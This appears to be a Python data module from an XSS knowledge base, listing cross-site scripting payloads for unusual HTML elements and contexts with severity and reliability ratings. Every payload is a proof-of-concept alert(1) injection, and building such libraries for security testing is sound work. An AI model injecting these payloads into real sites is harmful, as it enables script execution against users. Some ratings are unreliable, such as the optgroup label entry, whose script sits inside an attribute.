#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26

Rare/Unusual Context XSS Payloads
Edge cases and unusual injection points
"""

from ..models import PayloadEntry


RARE_CONTEXTS_DATABASE = {
    # ===== CONTENTEDITABLE XSS =====
    "rare_contenteditable_001": PayloadEntry(
        payload="<div contenteditable onfocus=alert(1)>click to edit</div>",
        contexts=["html_content"],
        tags=["rare", "contenteditable"],
        severity="high",
        cvss_score=7.5,
        description="Contenteditable onfocus",
        reliability="high",
    ),
    "rare_contenteditable_002": PayloadEntry(
        payload="<div contenteditable onpaste=alert(1)>paste here</div>",
        contexts=["html_content"],
        tags=["rare", "contenteditable"],
        severity="high",
        cvss_score=7.5,
        description="Contenteditable onpaste",
        reliability="high",
    ),
    # ===== SRCDOC XSS =====
    "rare_srcdoc_001": PayloadEntry(
        payload='<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
        contexts=["html_content"],
        tags=["rare", "srcdoc", "iframe"],
        severity="high",
        cvss_score=7.5,
        description="Srcdoc entity encoded",
        reliability="high",
    ),
    # ===== SANDBOX BYPASS =====
    "rare_sandbox_001": PayloadEntry(
        payload='<iframe sandbox="allow-scripts allow-same-origin" src="data:text/html,<script>alert(1)</script>"></iframe>',
        contexts=["html_content"],
        tags=["rare", "sandbox", "bypass"],
        severity="high",
        cvss_score=7.5,
        description="Sandbox allow-scripts bypass",
        reliability="high",
    ),
    # ===== PICTURE ELEMENT =====
    "rare_picture_001": PayloadEntry(
        payload='<picture><source media="(min-width:0)" srcset="x" onerror=alert(1)><img src=x></picture>',
        contexts=["html_content"],
        tags=["rare", "picture"],
        severity="high",
        cvss_score=7.5,
        description="Picture source onerror",
        reliability="medium",
    ),
    # ===== TEMPLATE ELEMENT INJECTION =====
    "rare_template_001": PayloadEntry(
        payload="<template id=t><script>alert(1)</script></template><script>document.body.appendChild(t.content.cloneNode(true))</script>",
        contexts=["html_content"],
        tags=["rare", "template"],
        severity="high",
        cvss_score=7.5,
        description="Template activation XSS",
        reliability="medium",
    ),
    # ===== SLOT ELEMENT =====
    "rare_slot_001": PayloadEntry(
        payload='<div><slot name="x" onslotchange=alert(1)></slot></div>',
        contexts=["html_content"],
        tags=["rare", "slot", "webcomponent"],
        severity="high",
        cvss_score=7.5,
        description="Slot onslotchange",
        reliability="low",
    ),
    # ===== DIALOG ELEMENT =====
    "rare_dialog_001": PayloadEntry(
        payload="<dialog open onclose=alert(1)><form method=dialog><button>close</button></form></dialog>",
        contexts=["html_content"],
        tags=["rare", "dialog"],
        severity="high",
        cvss_score=7.5,
        description="Dialog onclose",
        reliability="medium",
    ),
    # ===== METER/PROGRESS =====
    "rare_meter_001": PayloadEntry(
        payload="<meter min=0 max=100 value=50 onmouseover=alert(1)></meter>",
        contexts=["html_content"],
        tags=["rare", "meter"],
        severity="high",
        cvss_score=7.5,
        description="Meter element XSS",
        reliability="high",
    ),
    "rare_progress_001": PayloadEntry(
        payload="<progress value=50 max=100 onclick=alert(1)></progress>",
        contexts=["html_content"],
        tags=["rare", "progress"],
        severity="high",
        cvss_score=7.5,
        description="Progress element XSS",
        reliability="high",
    ),
    # ===== OUTPUT ELEMENT =====
    "rare_output_001": PayloadEntry(
        payload='<form oninput="x.value=alert(1)"><input type=range><output name=x></output></form>',
        contexts=["html_content"],
        tags=["rare", "output", "oninput"],
        severity="high",
        cvss_score=7.5,
        description="Output oninput XSS",
        reliability="medium",
    ),
    # ===== DATALIST =====
    "rare_datalist_001": PayloadEntry(
        payload="<input list=x onfocus=alert(1)><datalist id=x><option value=test></datalist>",
        contexts=["html_content"],
        tags=["rare", "datalist"],
        severity="high",
        cvss_score=7.5,
        description="Datalist input XSS",
        reliability="high",
    ),
    # ===== AREA ELEMENT =====
    "rare_area_001": PayloadEntry(
        payload="<map name=x><area shape=rect coords=0,0,100,100 href=javascript:alert(1)></map><img usemap=#x src=valid.jpg>",
        contexts=["html_content"],
        tags=["rare", "area", "map"],
        severity="high",
        cvss_score=7.5,
        description="Area element XSS",
        reliability="high",
    ),
    # ===== BLINK/WBR =====
    "rare_blink_001": PayloadEntry(
        payload="<blink onclick=alert(1)>click</blink>",
        contexts=["html_content"],
        tags=["rare", "blink", "deprecated"],
        severity="high",
        cvss_score=7.5,
        description="Blink element XSS",
        reliability="low",
    ),
    "rare_wbr_001": PayloadEntry(
        payload="<wbr onclick=alert(1)>",
        contexts=["html_content"],
        tags=["rare", "wbr"],
        severity="high",
        cvss_score=7.5,
        description="WBR element XSS",
        reliability="low",
    ),
    # ===== COMMAND ELEMENT =====
    "rare_command_001": PayloadEntry(
        payload="<menu type=context><command onclick=alert(1)>Click</command></menu>",
        contexts=["html_content"],
        tags=["rare", "command", "deprecated"],
        severity="high",
        cvss_score=7.5,
        description="Command element XSS",
        reliability="low",
    ),
    # ===== MENUITEM =====
    "rare_menuitem_001": PayloadEntry(
        payload="<menu type=context><menuitem onclick=alert(1)>Click</menuitem></menu>",
        contexts=["html_content"],
        tags=["rare", "menuitem", "deprecated"],
        severity="high",
        cvss_score=7.5,
        description="Menuitem element XSS",
        reliability="low",
    ),
    # ===== RUBY ELEMENT =====
    "rare_ruby_001": PayloadEntry(
        payload="<ruby onclick=alert(1)>text<rt>annotation</rt></ruby>",
        contexts=["html_content"],
        tags=["rare", "ruby"],
        severity="high",
        cvss_score=7.5,
        description="Ruby element XSS",
        reliability="high",
    ),
    # ===== FIGURE/FIGCAPTION =====
    "rare_figure_001": PayloadEntry(
        payload="<figure onclick=alert(1)><img src=x><figcaption>caption</figcaption></figure>",
        contexts=["html_content"],
        tags=["rare", "figure"],
        severity="high",
        cvss_score=7.5,
        description="Figure element XSS",
        reliability="high",
    ),
    # ===== TIME ELEMENT =====
    "rare_time_001": PayloadEntry(
        payload='<time onclick=alert(1) datetime="2025-01-01">New Year</time>',
        contexts=["html_content"],
        tags=["rare", "time"],
        severity="high",
        cvss_score=7.5,
        description="Time element XSS",
        reliability="high",
    ),
    # ===== FIELDSET/LEGEND =====
    "rare_fieldset_001": PayloadEntry(
        payload="<fieldset onclick=alert(1)><legend>Title</legend>Content</fieldset>",
        contexts=["html_content"],
        tags=["rare", "fieldset"],
        severity="high",
        cvss_score=7.5,
        description="Fieldset element XSS",
        reliability="high",
    ),
    # ===== OPTGROUP =====
    "rare_optgroup_001": PayloadEntry(
        payload='<select><optgroup label="<script>alert(1)</script>"><option>x</option></optgroup></select>',
        contexts=["html_content"],
        tags=["rare", "optgroup"],
        severity="high",
        cvss_score=7.5,
        description="Optgroup label XSS",
        reliability="medium",
    ),
}

RARE_CONTEXTS_TOTAL = len(RARE_CONTEXTS_DATABASE)
